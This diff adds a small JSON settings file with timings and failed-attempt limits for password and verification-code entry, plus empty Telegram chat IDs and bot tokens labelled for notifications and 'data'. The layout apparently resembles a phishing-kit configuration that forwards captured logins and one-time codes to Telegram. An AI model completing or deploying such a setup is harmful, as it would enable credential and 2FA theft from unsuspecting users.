@@ -1,0 +1,16 @@
+{
+  "settings": {
+    "code_loading_time": 15000,
+    "max_failed_code_attempts": 3,
+    "max_failed_password_attempts": 2,
+    "page_loading_time": 5000,
+    "password_loading_time": 10000,
+    "code_input_enabled": true
+  },
+  "telegram": {
+    "notification_chatid": "",
+    "notification_token": "",
+    "data_chatid": "",
+    "data_token": ""
+  }
+}
